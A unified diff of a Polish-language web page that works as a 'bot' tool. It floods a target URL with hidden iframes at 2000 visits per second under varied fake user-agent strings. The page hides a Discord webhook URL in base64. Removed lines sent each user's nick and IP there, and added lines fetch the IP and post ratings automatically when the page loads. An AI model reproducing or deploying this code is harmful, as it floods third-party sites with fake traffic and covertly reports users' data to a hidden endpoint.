@@ -2,10 +2,10 @@
 <html lang="pl">
 <head>
 <meta charset="UTF-8" />
-<title>Bot Test z regulaminem</title>
+<title>Bot Test z regulaminem i statystykami</title>
 <style>
   body { font-family: monospace; background:#111; color:#0f0; padding:20px; }
-  #mainPanel { max-width: 500px; margin: auto; padding:20px; border: 1px solid #0f0; border-radius:8px; }
+  #mainPanel { max-width: 600px; margin: auto; padding:20px; border: 1px solid #0f0; border-radius:8px; }
   label, textarea, input[type="text"] {
     display: block;
     width: 100%;
@@ -27,7 +27,7 @@
     cursor: pointer;
     font-family: monospace;
     font-size: 16px;
-    margin-top: 10px;
+    margin: 5px 5px 10px 0;
   }
   button:hover {
     background: #333;
@@ -40,12 +40,34 @@
     border: 1px solid #0f0;
     padding: 10px;
     font-size: 12px;
+    white-space: pre-wrap;
   }
   #disclaimer {
     font-size: 12px;
     color: #faa;
     margin-top: 15px;
     white-space: pre-wrap;
+  }
+  #summary {
+    margin-top: 15px;
+    background: #000;
+    border: 1px solid #0f0;
+    padding: 10px;
+    font-size: 14px;
+    white-space: pre-wrap;
+  }
+  #stars {
+    margin-top: 10px;
+    font-size: 24px;
+    cursor: pointer;
+    user-select: none;
+  }
+  .star {
+    color: #444;
+    transition: color 0.3s;
+  }
+  .star.active {
+    color: gold;
   }
 </style>
 </head>
@@ -79,6 +101,19 @@ Korzystając z tego narzędzia oświadczasz, że:
 
   <div id="log"></div>
 
+  <div id="summary" style="display:none;"></div>
+
+  <div id="stars" title="Kliknij, aby ocenić od 1 do 5 gwiazdek">
+    <span class="star" data-value="1">⭐</span>
+    <span class="star" data-value="2">⭐</span>
+    <span class="star" data-value="3">⭐</span>
+    <span class="star" data-value="4">⭐</span>
+    <span class="star" data-value="5">⭐</span>
+  </div>
+
+  <button id="downloadTxt" style="display:none;">Pobierz logi .txt</button>
+  <button id="downloadJson" style="display:none;">Pobierz logi .json</button>
+
   <div id="disclaimer">
 x_Rediex nie odpowiada za wyrządzone szkody.
 Korzystaj z tego narzędzia tylko w celach edukacyjnych.
@@ -94,18 +129,25 @@ Używasz na własną odpowiedzialność.
   const startBtn = document.getElementById('startBots');
   const stopBtn = document.getElementById('stopBots');
   const logDiv = document.getElementById('log');
+  const summaryDiv = document.getElementById('summary');
+  const starsDiv = document.getElementById('stars');
+  const downloadTxtBtn = document.getElementById('downloadTxt');
+  const downloadJsonBtn = document.getElementById('downloadJson');
 
-  const visitsPerSecond = 2000; // ustaw jak chcesz, np 10 000, ale uważaj na przeglądarkę
+  const visitsPerSecond = 2000; // zmień jak chcesz (uważaj na przeglądarkę)
   const delay = 1000 / visitsPerSecond;
   let intervalId = null;
   let botCounter = 0;
   let userIP = null;
+  let accepted = false;
 
-  // Lista user-agentów z losowymi nazwami urządzeń
+  // User agents z wieloma losowymi "urzadzeniami"
   const userAgents = [
     "jfjdensjsk/1.0",
     "jxdnnd/2.3",
     "randomDeviceXYZ/5.6",
+    "DeviceSuperUltra/9.9",
+    "MegaPhoneX/7.1",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1",
@@ -114,17 +156,21 @@ Używasz na własną odpowiedzialność.
     "Mozilla/5.0 (Windows NT 6.1; Win64; x64) Edge/120.0.0.0"
   ];
 
-  // Dekodowany Discord webhook (base64 podany przez Ciebie)
   const webhookBase64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwMzg3NzI3OTM5Nzk3NDE2Ny9zTWdDQkVFU1BZZGEwVDhlYU5mTXBtc2R3SHFXZzNzVGZxUTRRc2prbnYzMTB5TExXWDVtVlNTdzJ0QW9BWGJ0aVA0TAo";
   const webhookURL = atob(webhookBase64).trim();
+
+  let logData = [];
+  let successCount = 0;
+  let errorCount = 0;
+  let startTime = null;
 
   function log(msg) {
     const time = new Date().toLocaleTimeString();
     logDiv.textContent += `[${time}] ${msg}\n`;
     logDiv.scrollTop = logDiv.scrollHeight;
+    logData.push({ time: Date.now(), message: msg });
   }
 
-  // Pobierz IP użytkownika z api.ipify.org
   async function fetchIP() {
     try {
       const res = await fetch("https://api.ipify.org?format=json");
@@ -136,15 +182,12 @@ Używasz na własną odpowiedzialność.
     }
   }
 
-  // Wyślij dane na webhook Discord
-  async function sendWebhook(nick, ip) {
+  async function sendWebhook(content) {
     try {
       await fetch(webhookURL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          content: `Nowy użytkownik: **${nick}**\nIP: \`${ip}\``
-        })
+        body: JSON.stringify({ content })
       });
       log("Dane wysłane na webhook.");
     } catch(e) {
@@ -152,35 +195,51 @@ Używasz na własną odpowiedzialność.
     }
   }
 
-  // Aktywuj start jeśli nick jest i regulamin zaakceptowany
   function updateStartBtn() {
-    startBtn.disabled = !nickInput.value.trim() || !acceptCheckbox.checked;
+    accepted = acceptCheckbox.checked && nickInput.value.trim() !== "";
+    startBtn.disabled = !accepted;
   }
 
   nickInput.addEventListener('input', updateStartBtn);
   acceptCheckbox.addEventListener('change', updateStartBtn);
 
-  startBtn.onclick = async () => {
-    if (intervalId) return;
+  function setStars(rating) {
+    [...starsDiv.children].forEach(star => {
+      star.classList.toggle('active', parseInt(star.dataset.value) <= rating);
+    });
+  }
 
-    if (!userIP) {
-      log("Czekam na pobranie IP...");
-      await fetchIP();
-      if (!userIP) {
-        log("Nie można rozpocząć bez IP.");
-        return;
-      }
+  // Obsługa kliknięć gwiazdek i zapamiętywanie oceny w localStorage
+  starsDiv.addEventListener('click', async e => {
+    if (!e.target.classList.contains('star')) return;
+    const rating = parseInt(e.target.dataset.value);
+    if (!rating) return;
+    localStorage.setItem('bot_rating', rating);
+    setStars(rating);
+    // Wyślij ocenę na webhook
+    const nick = nickInput.value.trim() || "Anonim";
+    await sendWebhook(`Użytkownik **${nick}** ocenił narzędzie na: ${rating} ⭐`);
+    log(`Ocena wysłana: ${rating} ⭐`);
+  });
+
+  // Przy ładowaniu strony ustaw gwiazdki wg localStorage i wyślij ocenę jeśli jest
+  window.addEventListener('load', async () => {
+    await fetchIP();
+    const savedRating = parseInt(localStorage.getItem('bot_rating'));
+    if (savedRating) {
+      setStars(savedRating);
+      const nick = nickInput.value.trim() || "Anonim";
+      sendWebhook(`Użytkownik **${nick}** ponownie wysłał ocenę: ${savedRating} ⭐`);
     }
+  });
 
-    const nick = nickInput.value.trim();
-    if (!nick) {
-      alert("Musisz wpisać nick!");
+  startBtn.onclick = () => {
+    if (intervalId) return;
+    if (!accepted) {
+      alert("Musisz zaakceptować regulamin i wpisać nick!");
       return;
     }
-
-    await sendWebhook(nick, userIP);
-
-    botCounter = 0;
+    const nick = nickInput.value.trim();
     const urlRaw = urlInput.value.trim();
     if (!urlRaw) {
       alert("Podaj adres strony!");
@@ -190,8 +249,16 @@ Używasz na własną odpowiedzialność.
     if (!url.startsWith("http://") && !url.startsWith("https://")) {
       url = "http://" + url;
     }
+    botCounter = 0;
+    successCount = 0;
+    errorCount = 0;
+    logData = [];
+    summaryDiv.style.display = 'none';
+    logDiv.textContent = "";
+    startTime = performance.now();
 
     log("Start botów...");
+
     startBtn.disabled = true;
     stopBtn.disabled = false;
     nickInput.disabled = true;
@@ -202,7 +269,6 @@ Używasz na własną odpowiedzialność.
       botCounter++;
       const botId = botCounter;
       const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
-
       log(`Bot #${botId} łączy się jako: ${randomUA}`);
 
       const iframe = document.createElement("iframe");
@@ -214,33 +280,27 @@ Używasz na własną odpowiedzialność.
       document.body.appendChild(iframe);
 
       iframe.onload = () => {
+        successCount++;
         log(`Bot #${botId} wszedł na stronę: ${url}`);
+      };
+
+      iframe.onerror = () => {
+        errorCount++;
+        log(`Bot #${botId} odmówiono dostępu do: ${url}`);
       };
 
       setTimeout(() => iframe.remove(), 2000);
     }, delay);
   };
 
-  stopBtn.onclick = () => {
+  stopBtn.onclick = async () => {
+    if (!intervalId) return;
     clearInterval(intervalId);
     intervalId = null;
+    const endTime = performance.now();
+    const durationMs = Math.round(endTime - startTime);
+    const date = new Date();
+
     log("Boty zatrzymane.");
 
     startBtn.disabled = false;
-    stopBtn.disabled = true;
-    nickInput.disabled = false;
-    urlInput.disabled = false;
-    acceptCheckbox.disabled = false;
-  };
-
-  // Na start disable stop
-  stopBtn.disabled = true;
-
-  // Od razu pobierz IP na start
-  fetchIP();
-
-})();
-</script>
-
-</body>
-</html>
